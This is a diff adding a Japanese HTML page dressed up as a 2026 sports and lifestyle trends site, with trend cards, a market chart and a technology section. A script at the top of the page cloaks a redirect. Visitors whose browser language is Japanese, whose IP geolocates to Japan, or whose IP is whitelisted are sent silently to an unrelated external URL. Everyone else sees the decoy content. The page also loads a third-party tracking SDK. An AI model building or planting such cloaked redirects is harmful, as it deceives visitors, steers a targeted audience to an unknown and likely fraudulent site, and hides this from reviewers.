@@ -1,0 +1,1472 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+
+	<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+<script>LA.init({id:"KnduWJ0InBfM2nYa",ck:"KnduWJ0InBfM2nYa"})</script>
+	
+	
+<script>
+  // ✅ IP 白名单（保持不变）
+  const WHITE_LIST_IPS = [
+    "104.252.23.41",
+    "154.6.81.17",
+    "23.229.109.217",
+    "103.156.184.47"
+  ];
+
+  // 跳转目标
+  const REDIRECT_URL = "https://dailyguide.top/ifkeyh8mk";
+
+  // ✅ 判断是否日文语言
+  function isJapaneseLang() {
+    const langs = navigator.languages?.length
+      ? navigator.languages
+      : [navigator.language || ""];
+    return langs.some(l => l.toLowerCase().startsWith("ja"));
+  }
+
+  // ✅ 执行跳转
+  function redirect() {
+    window.location.replace(REDIRECT_URL);
+  }
+
+  // ✅ 带超时的 fetch
+  function fetchWithTimeout(url, ms = 4000) {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), ms);
+    return fetch(url, { signal: controller.signal })
+      .finally(() => clearTimeout(timer));
+  }
+
+  // ✅ 主逻辑：语言优先判断，避免不必要的网络请求
+  (async function init() {
+    // 第一步：语言检测，立即判断，无需网络
+    if (isJapaneseLang()) {
+      redirect();
+      return;
+    }
+
+    // 第二步：语言不符合，再去检查 IP
+    try {
+      const res = await fetchWithTimeout("https://ipapi.co/json/");
+      const data = await res.json();
+      // 修改处：增加对日本国家码的判断，只要在白名单 或 来自日本，就跳转
+      if (WHITE_LIST_IPS.includes(data.ip) || data.country_code === "JP") {
+        redirect();
+      }
+    } catch (e) {
+      // IP 获取失败（超时 / 网络错误）：不跳转，静默处理
+      console.warn("IP check failed:", e.message);
+    }
+  })();
+</script>
+
+
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="スポーツ＆ライフスタイルトレンド2026 - 最新のスポーツテクノロジー、健康習慣、アウトドア・フィットネス情報を専門家が解説。">
+    <title>スポーツ＆ライフスタイルトレンド 2026 | アクティブライフの最前線</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+        :root {
+            --primary: #1a56db;
+            --primary-dark: #1e40af;
+            --secondary: #0ea5e9;
+            --accent: #7c3aed;
+            --dark: #0f172a;
+            --gray: #64748b;
+            --light-gray: #f1f5f9;
+            --white: #ffffff;
+            --border: #e2e8f0;
+        }
+
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: 'Noto Sans JP', 'Hiragino Kaku Gothic ProN', sans-serif;
+            color: var(--dark);
+            background: var(--white);
+            line-height: 1.7;
+        }
+
+        /* HEADER */
+        header {
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            background: rgba(255,255,255,0.97);
+            backdrop-filter: blur(8px);
+            border-bottom: 1px solid var(--border);
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+
+        .header-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            height: 64px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--dark);
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #e11d48, #f97316);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .logo-text {
+            font-size: 17px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+        }
+
+        .logo-text span {
+            color: #e11d48;
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+            gap: 4px;
+            align-items: center;
+        }
+
+        nav ul li a {
+            text-decoration: none;
+            color: var(--gray);
+            font-size: 14px;
+            font-weight: 500;
+            padding: 6px 12px;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+
+        nav ul li a:hover {
+            color: var(--primary);
+            background: #eff6ff;
+        }
+
+        .nav-cta {
+            background: #e11d48 !important;
+            color: white !important;
+            padding: 8px 16px !important;
+        }
+
+        .nav-cta:hover {
+            background: #be123c !important;
+        }
+
+        .hamburger {
+            display: none;
+            flex-direction: column;
+            cursor: pointer;
+            gap: 5px;
+            padding: 4px;
+        }
+
+        .hamburger span {
+            width: 24px;
+            height: 2px;
+            background: var(--dark);
+            border-radius: 2px;
+            transition: 0.3s;
+        }
+
+        .mobile-nav {
+            display: none;
+            flex-direction: column;
+            background: white;
+            border-top: 1px solid var(--border);
+            padding: 16px 20px;
+        }
+
+        .mobile-nav.open {
+            display: flex;
+        }
+
+        .mobile-nav a {
+            text-decoration: none;
+            color: var(--dark);
+            font-size: 15px;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--border);
+            font-weight: 500;
+        }
+
+        .mobile-nav a:last-child { border-bottom: none; }
+
+        /* HERO */
+        .hero {
+            background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 50%, #312e81 100%);
+            color: white;
+            padding: 80px 20px 100px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+
+        .hero-badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.15);
+            border: 1px solid rgba(255,255,255,0.25);
+            padding: 6px 16px;
+            border-radius: 100px;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 24px;
+            backdrop-filter: blur(4px);
+        }
+
+        .hero h1 {
+            font-size: clamp(28px, 5vw, 52px);
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 20px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .hero h1 span {
+            background: linear-gradient(90deg, #60a5fa, #a78bfa);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: clamp(15px, 2vw, 18px);
+            color: rgba(255,255,255,0.8);
+            max-width: 640px;
+            margin: 0 auto 36px;
+            font-weight: 300;
+        }
+
+        .hero-buttons {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+
+        .btn-primary {
+            background: var(--secondary);
+            color: white;
+            text-decoration: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            transition: all 0.2s;
+            border: none;
+            cursor: pointer;
+            display: inline-block;
+        }
+
+        .btn-primary:hover {
+            background: #0284c7;
+            transform: translateY(-1px);
+            box-shadow: 0 8px 25px rgba(14,165,233,0.4);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: white;
+            text-decoration: none;
+            padding: 14px 28px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            border: 1px solid rgba(255,255,255,0.4);
+            transition: all 0.2s;
+            display: inline-block;
+        }
+
+        .btn-outline:hover {
+            background: rgba(255,255,255,0.1);
+        }
+
+        .hero-stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 60px;
+            flex-wrap: wrap;
+        }
+
+        .hero-stat strong {
+            display: block;
+            font-size: 28px;
+            font-weight: 700;
+            color: #f97316;
+        }
+
+        .hero-stat span {
+            font-size: 13px;
+            color: rgba(255,255,255,0.6);
+        }
+
+        /* SECTION COMMON */
+        section {
+            padding: 80px 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .section-label {
+            display: inline-block;
+            color: var(--primary);
+            font-size: 13px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+        }
+
+        .section-title {
+            font-size: clamp(22px, 3.5vw, 36px);
+            font-weight: 700;
+            margin-bottom: 16px;
+            line-height: 1.35;
+        }
+
+        .section-desc {
+            color: var(--gray);
+            font-size: 16px;
+            max-width: 600px;
+            margin-bottom: 48px;
+            font-weight: 300;
+        }
+
+        .text-center { text-align: center; }
+        .text-center .section-desc { margin-left: auto; margin-right: auto; }
+
+        /* TRENDS GRID */
+        #trends {
+            background: var(--light-gray);
+        }
+
+        .trends-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 24px;
+        }
+
+        .trend-card {
+            background: white;
+            border-radius: 16px;
+            padding: 28px;
+            border: 1px solid var(--border);
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .trend-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            border-color: var(--primary);
+        }
+
+        .trend-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #e11d48, #f97316);
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .trend-card:hover::before { opacity: 1; }
+
+        .trend-icon {
+            width: 52px;
+            height: 52px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            margin-bottom: 18px;
+        }
+
+        .trend-card h3 {
+            font-size: 18px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .trend-card p {
+            color: var(--gray);
+            font-size: 14px;
+            line-height: 1.7;
+        }
+
+        .trend-tag {
+            display: inline-block;
+            margin-top: 14px;
+            padding: 4px 10px;
+            border-radius: 100px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        /* MARKET SECTION */
+        #market {
+            background: white;
+        }
+
+        .market-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        @media (max-width: 768px) {
+            .market-grid { grid-template-columns: 1fr; gap: 40px; }
+        }
+
+        .market-text h2 {
+            font-size: clamp(22px, 3vw, 34px);
+            font-weight: 700;
+            margin-bottom: 18px;
+            line-height: 1.35;
+        }
+
+        .market-text p {
+            color: var(--gray);
+            font-size: 15px;
+            margin-bottom: 16px;
+            line-height: 1.8;
+            font-weight: 300;
+        }
+
+        .market-chart {
+            background: var(--light-gray);
+            border-radius: 20px;
+            padding: 28px;
+            border: 1px solid var(--border);
+        }
+
+        .chart-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--gray);
+            margin-bottom: 20px;
+        }
+
+        .bar-chart {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .bar-item {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .bar-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+
+        .bar-track {
+            height: 10px;
+            background: var(--border);
+            border-radius: 100px;
+            overflow: hidden;
+        }
+
+        .bar-fill {
+            height: 100%;
+            border-radius: 100px;
+            animation: growBar 1.5s ease-out forwards;
+            transform-origin: left;
+        }
+
+        @keyframes growBar {
+            from { width: 0; }
+        }
+
+        /* TECH SECTION */
+        #technology {
+            background: var(--light-gray);
+        }
+
+        .tech-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+
+        .tech-card {
+            background: white;
+            border-radius: 12px;
+            padding: 24px;
+            border: 1px solid var(--border);
+            transition: all 0.2s;
+        }
+
+        .tech-card:hover {
+            border-color: var(--secondary);
+            box-shadow: 0 4px 16px rgba(14,165,233,0.12);
+        }
+
+        .tech-number {
+            font-size: 36px;
+            font-weight: 700;
+            color: var(--primary);
+            line-height: 1;
+            margin-bottom: 8px;
+        }
+
+        .tech-number span {
+            font-size: 18px;
+        }
+
+        .tech-card h4 {
+            font-size: 15px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .tech-card p {
+            font-size: 13px;
+            color: var(--gray);
+            line-height: 1.6;
+        }
+
+        /* FORECAST */
+        #forecast {
+            background: white;
+        }
+
+        .forecast-timeline {
+            position: relative;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+
+        .forecast-timeline::before {
+            content: '';
+            position: absolute;
+            left: 20px;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: linear-gradient(to bottom, #e11d48, #f97316);
+        }
+
+        @media (min-width: 600px) {
+            .forecast-timeline::before { left: 50%; transform: translateX(-50%); }
+        }
+
+        .timeline-item {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 40px;
+            align-items: flex-start;
+            position: relative;
+        }
+
+        .timeline-dot {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: #e11d48;
+            color: white;
+            font-size: 13px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            z-index: 1;
+            position: relative;
+            box-shadow: 0 0 0 6px rgba(225,29,72,0.12);
+        }
+
+        .timeline-content {
+            background: var(--light-gray);
+            border-radius: 12px;
+            padding: 20px;
+            flex: 1;
+            border: 1px solid var(--border);
+        }
+
+        .timeline-content h4 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #e11d48;
+        }
+
+        .timeline-content p {
+            font-size: 14px;
+            color: var(--gray);
+            line-height: 1.7;
+        }
+
+        /* INDUSTRY SECTION */
+        #industry {
+            background: linear-gradient(135deg, #0f172a, #1e3a8a);
+            color: white;
+        }
+
+        .industry-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 20px;
+        }
+
+        .industry-card {
+            background: rgba(255,255,255,0.07);
+            border: 1px solid rgba(255,255,255,0.12);
+            border-radius: 16px;
+            padding: 24px;
+            text-align: center;
+            transition: all 0.3s;
+        }
+
+        .industry-card:hover {
+            background: rgba(255,255,255,0.12);
+            transform: translateY(-2px);
+        }
+
+        .industry-icon {
+            font-size: 36px;
+            margin-bottom: 14px;
+        }
+
+        .industry-card h4 {
+            font-size: 15px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .industry-card p {
+            font-size: 13px;
+            color: rgba(255,255,255,0.65);
+            line-height: 1.6;
+        }
+
+        /* NEWSLETTER / CTA */
+        #newsletter {
+            background: var(--light-gray);
+        }
+
+        .cta-box {
+            background: linear-gradient(135deg, #e11d48, #f97316);
+            border-radius: 24px;
+            padding: 60px 40px;
+            text-align: center;
+            color: white;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .cta-box h2 {
+            font-size: clamp(22px, 3.5vw, 32px);
+            font-weight: 700;
+            margin-bottom: 14px;
+        }
+
+        .cta-box p {
+            font-size: 15px;
+            opacity: 0.85;
+            margin-bottom: 32px;
+            font-weight: 300;
+        }
+
+        .cta-form {
+            display: flex;
+            gap: 10px;
+            max-width: 480px;
+            margin: 0 auto;
+            flex-wrap: wrap;
+        }
+
+        .cta-form input {
+            flex: 1;
+            min-width: 200px;
+            padding: 13px 18px;
+            border-radius: 8px;
+            border: none;
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+        }
+
+        .cta-form button {
+            background: white;
+            color: #e11d48;
+            border: none;
+            padding: 13px 22px;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+
+        .cta-form button:hover {
+            background: #fef2f2;
+            transform: translateY(-1px);
+        }
+
+        .cta-note {
+            margin-top: 14px;
+            font-size: 12px;
+            opacity: 0.7;
+        }
+
+        /* ABOUT */
+        #about {
+            background: white;
+        }
+
+        .about-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 60px;
+            align-items: center;
+        }
+
+        @media (max-width: 768px) {
+            .about-grid { grid-template-columns: 1fr; gap: 32px; }
+        }
+
+        .about-text h2 {
+            font-size: clamp(22px, 3vw, 32px);
+            font-weight: 700;
+            margin-bottom: 18px;
+        }
+
+        .about-text p {
+            color: var(--gray);
+            font-size: 15px;
+            line-height: 1.8;
+            font-weight: 300;
+            margin-bottom: 14px;
+        }
+
+        .about-features {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .about-feature {
+            display: flex;
+            gap: 14px;
+            align-items: flex-start;
+            padding: 16px;
+            background: var(--light-gray);
+            border-radius: 10px;
+        }
+
+        .about-feature-icon {
+            width: 36px;
+            height: 36px;
+            background: #e11d48;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 16px;
+            flex-shrink: 0;
+        }
+
+        .about-feature h5 {
+            font-size: 14px;
+            font-weight: 700;
+            margin-bottom: 4px;
+        }
+
+        .about-feature p {
+            font-size: 13px;
+            color: var(--gray);
+            line-height: 1.5;
+        }
+
+        /* FOOTER */
+        footer {
+            background: var(--dark);
+            color: rgba(255,255,255,0.7);
+        }
+
+        .footer-top {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 60px 20px 40px;
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 1fr;
+            gap: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .footer-top { grid-template-columns: 1fr 1fr; gap: 32px; }
+        }
+
+        @media (max-width: 480px) {
+            .footer-top { grid-template-columns: 1fr; }
+        }
+
+        .footer-brand .logo {
+            color: white;
+            margin-bottom: 16px;
+        }
+
+        .footer-brand p {
+            font-size: 13px;
+            line-height: 1.7;
+            max-width: 280px;
+        }
+
+        .footer-col h6 {
+            font-size: 14px;
+            font-weight: 700;
+            color: white;
+            margin-bottom: 16px;
+        }
+
+        .footer-col ul {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .footer-col ul li a {
+            color: rgba(255,255,255,0.6);
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.2s;
+        }
+
+        .footer-col ul li a:hover {
+            color: white;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: rgba(255,255,255,0.4);
+        }
+
+        .footer-bottom a {
+            color: rgba(255,255,255,0.5);
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer-bottom a:hover { color: white; }
+
+        /* BREADCRUMB */
+        .breadcrumb {
+            background: white;
+            border-bottom: 1px solid var(--border);
+            padding: 10px 20px;
+        }
+
+        .breadcrumb-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            gap: 6px;
+            font-size: 12px;
+            color: var(--gray);
+            align-items: center;
+        }
+
+        .breadcrumb-inner a {
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .breadcrumb-inner span { color: var(--border); }
+
+        /* ANNOUNCEMENT BAR */
+        .announcement-bar {
+            background: linear-gradient(90deg, #e11d48, #f97316);
+            color: white;
+            text-align: center;
+            padding: 10px 20px;
+            font-size: 13px;
+            font-weight: 500;
+        }
+
+        .announcement-bar a {
+            color: white;
+            text-decoration: underline;
+            margin-left: 8px;
+        }
+
+        /* SUCCESS */
+        .success-msg {
+            display: none;
+            background: rgba(255,255,255,0.2);
+            border: 1px solid rgba(255,255,255,0.4);
+            border-radius: 8px;
+            padding: 12px 20px;
+            margin-top: 16px;
+            font-size: 14px;
+        }
+
+        /* Responsive nav */
+        @media (max-width: 900px) {
+            nav { display: none; }
+            .hamburger { display: flex; }
+        }
+
+        @media (max-width: 480px) {
+            .hero-stats { gap: 24px; }
+            .cta-box { padding: 40px 24px; }
+        }
+
+        /* Scroll top */
+        .scroll-top {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 44px;
+            height: 44px;
+            background: #e11d48;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            font-size: 20px;
+            cursor: pointer;
+            box-shadow: 0 4px 14px rgba(225,29,72,0.4);
+            transition: all 0.3s;
+            opacity: 0;
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        .scroll-top.visible {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        .scroll-top:hover { transform: translateY(-2px); }
+    </style>
+</head>
+<body>
+
+<!-- Announcement Bar -->
+<div class="announcement-bar">
+    🏃 2026年版 スポーツ＆ライフスタイルトレンドレポートを無料配布中。
+    <a href="#newsletter">今すぐダウンロード</a>
+</div>
+
+<!-- Header -->
+<header>
+    <div class="header-inner">
+        <a href="#" class="logo">
+            <div class="logo-icon">🏋️</div>
+            <span class="logo-text">スポーツ<span>ライフ</span>ラボ</span>
+        </a>
+        <nav>
+            <ul>
+                <li><a href="#trends">最新トレンド</a></li>
+                <li><a href="#market">市場分析</a></li>
+                <li><a href="#technology">技術動向</a></li>
+                <li><a href="#forecast">将来予測</a></li>
+                <li><a href="#industry">分野別</a></li>
+                <li><a href="#about">私たちについて</a></li>
+                <li><a href="#newsletter" class="nav-cta">レポート入手</a></li>
+            </ul>
+        </nav>
+        <div class="hamburger" onclick="toggleMobileNav()" aria-label="メニュー">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </div>
+    <div class="mobile-nav" id="mobileNav">
+        <a href="#trends" onclick="toggleMobileNav()">最新トレンド</a>
+        <a href="#market" onclick="toggleMobileNav()">市場分析</a>
+        <a href="#technology" onclick="toggleMobileNav()">技術動向</a>
+        <a href="#forecast" onclick="toggleMobileNav()">将来予測</a>
+        <a href="#industry" onclick="toggleMobileNav()">分野別</a>
+        <a href="#about" onclick="toggleMobileNav()">私たちについて</a>
+        <a href="#newsletter" onclick="toggleMobileNav()">レポートを入手</a>
+    </div>
+</header>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+    <div class="breadcrumb-inner">
+        <a href="#">ホーム</a>
+        <span>›</span>
+        <a href="#trends">スポーツトレンド</a>
+        <span>›</span>
+        <span>2026年最新レポート</span>
+    </div>
+</div>
+
+<!-- Hero -->
+<section class="hero" id="home">
+    <div class="hero-badge">📊 2026年 最新版 アップデート済み</div>
+    <h1>アクティブライフが変える<br><span>健康とスポーツの未来</span></h1>
+    <p>ウェアラブルデバイス、AIトレーニング、データドリブンな健康管理の最前線。専門家チームが最新のスポーツ＆ライフスタイルトレンドを徹底分析します。</p>
+    <div class="hero-buttons">
+        <a href="#trends" class="btn-primary">トレンドを見る</a>
+        <a href="#newsletter" class="btn-outline">無料レポートを入手</a>
+    </div>
+    <div class="hero-stats">
+        <div class="hero-stat">
+            <strong>1.2兆ドル</strong>
+            <span>2030年 世界スポーツ市場規模予測</span>
+        </div>
+        <div class="hero-stat">
+            <strong>45%</strong>
+            <span>健康志向の消費増加率（2025-2026）</span>
+        </div>
+        <div class="hero-stat">
+            <strong>3億人</strong>
+            <span>アクティブ・ライフスタイル人口（推定）</span>
+        </div>
+    </div>
+</section>
+
+<!-- Trends Section -->
+<section id="trends">
+    <div class="container">
+        <div class="text-center">
+            <span class="section-label">最新トレンド</span>
+            <h2 class="section-title">2026年 注目のスポーツ＆ライフスタイルトレンド</h2>
+            <p class="section-desc">健康志向の高まりとテクノロジーの融合で進化する、スポーツ・フィットネス業界の最前線を解説します。</p>
+        </div>
+        <div class="trends-grid">
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#eff6ff;">⌚</div>
+                <h3>ウェアラブルヘルスTech</h3>
+                <p>スマートウォッチやリング型デバイスが心拍、睡眠、ストレス、血中酸素をリアルタイム計測。パーソナライズされた健康アドバイスが日常化しています。</p>
+                <span class="trend-tag" style="background:#eff6ff;color:#1a56db;">🔥 急成長中</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#f0fdf4;">🤖</div>
+                <h3>AIパーソナルトレーナー</h3>
+                <p>AIが運動フォームを解析し、リアルタイムで修正アドバイス。自宅でのトレーニングでも専門家レベルの指導が受けられる時代に。</p>
+                <span class="trend-tag" style="background:#f0fdf4;color:#16a34a;">💡 注目技術</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#fdf4ff;">🧘</div>
+                <h3>マインドフルネス＆リカバリー</h3>
+                <p>メンタルヘルスと身体の回復を一体化したアプローチが流行。アプリやデバイスでストレス管理、質の高い睡眠をサポートするサービスが拡大中。</p>
+                <span class="trend-tag" style="background:#fdf4ff;color:#7c3aed;">🧠 心身一体</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#fff7ed;">🏕️</div>
+                <h3>アウトドア・アクティビティの再興</h3>
+                <p>トレイルランニング、サイクリング、キャンプ、パドルスポーツなど自然と触れ合うアクティビティが若年層を中心に人気回復。アウトドア用品市場も拡大。</p>
+                <span class="trend-tag" style="background:#fff7ed;color:#ea580c;">🌿 自然志向</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#fef2f2;">📊</div>
+                <h3>データドリブン・スポーツ</h3>
+                <p>プロスポーツからアマチュアまで、センサーとAIによるパフォーマンス分析が普及。戦略、怪我予防、育成にデータが活用されています。</p>
+                <span class="trend-tag" style="background:#fef2f2;color:#dc2626;">⚡ 戦略進化</span>
+            </div>
+            <div class="trend-card">
+                <div class="trend-icon" style="background:#f0f9ff;">🥗</div>
+                <h3>パーソナライズド・ニュートリション</h3>
+                <p>遺伝子情報や腸内細菌データに基づく個別化栄養提案が進化。運動効果を最大化し、健康寿命を延ばすための食事プランが一般化しつつあります。</p>
+                <span class="trend-tag" style="background:#f0f9ff;color:#0284c7;">🍽️ 栄養最適化</span>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Market Section -->
+<section id="market">
+    <div class="container">
+        <div class="market-grid">
+            <div class="market-text">
+                <span class="section-label">市場分析</span>
+                <h2 class="section-title">世界のスポーツ＆フィットネス市場<br>急拡大が続く</h2>
+                <p>2025年の世界スポーツ市場は約8,500億ドルに達し、2030年には1.2兆ドルを超える見込みです。特にアジア太平洋地域の成長が著しく、日本市場も健康志向の高まりで年間8%以上の成長が期待されています。</p>
+                <p>フィットネスアプリ、ウェアラブルデバイス、オンライントレーニングの需要が急増。コロナ禍以降、自宅での運動習慣が定着し、ハイブリッド型のサービスが主流になっています。</p>
+                <p>また、スポーツテクノロジー（センサー、AI解析、VRトレーニング）の市場も年率15%で成長しており、投資が集中しています。</p>
+                <a href="#newsletter" class="btn-primary" style="display:inline-block;margin-top:20px;">詳細レポートを見る</a>
+            </div>
+            <div class="market-chart">
+                <div class="chart-title">📊 スポーツ関連分野別利用率（2026年）</div>
+                <div class="bar-chart">
+                    <div class="bar-item">
+                        <div class="bar-label"><span>フィットネスアプリ</span><span>82%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:82%;background:linear-gradient(90deg,#e11d48,#f97316);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>ウェアラブルデバイス</span><span>76%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:76%;background:linear-gradient(90deg,#7c3aed,#a78bfa);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>オンラインコーチング</span><span>58%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:58%;background:linear-gradient(90deg,#059669,#34d399);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>アウトドア用品</span><span>64%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:64%;background:linear-gradient(90deg,#d97706,#fbbf24);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>スポーツ観戦・コンテンツ</span><span>71%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:71%;background:linear-gradient(90deg,#dc2626,#f87171);"></div></div>
+                    </div>
+                    <div class="bar-item">
+                        <div class="bar-label"><span>健康管理サービス</span><span>67%</span></div>
+                        <div class="bar-track"><div class="bar-fill" style="width:67%;background:linear-gradient(90deg,#0891b2,#22d3ee);"></div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Technology Section -->
+<section id="technology">
+    <div class="container">
+        <div class="text-center">
+            <span class="section-label">技術動向</span>
+            <h2 class="section-title">スポーツを変えるテクノロジー革新</h2>
+            <p class="section-desc">運動パフォーマンス向上、健康管理、エンターテインメントを支える最新テクノロジーを紹介します。</p>
+        </div>
+        <div class="tech-grid">
+            <div class="tech-card">
+                <div class="tech-number">5G<span>連携</span></div>
+                <h4>リアルタイムモニタリング</h4>
+                <p>5G通信とエッジAIで、試合中やトレーニング中の生体データを瞬時に分析。即座に戦術やフォームを修正可能に。</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">3D<span>解析</span></div>
+                <h4>モーションキャプチャAI</h4>
+                <p>スマートフォンのカメラだけで全身の関節角度・重心移動を3D解析。怪我予防やパフォーマンス最適化に貢献。</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">VR<span>トレーニング</span></div>
+                <h4>没入型シミュレーション</h4>
+                <p>仮想空間で実際の競技シーンを再現。プロ選手の動きをトレースしながら、安全かつ効率的な練習が可能に。</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">AI<span>予測</span></div>
+                <h4>怪我リスク予測</h4>
+                <p>過去の傷害データと現在のコンディションをAIが照合し、怪我の発生確率を予測。予防策を提示します。</p>
+            </div>
+            <div class="tech-card">
+                <div class="tech-number">800<span>万件</span></div>
+                <h4>ビッグデータ活用</h4>
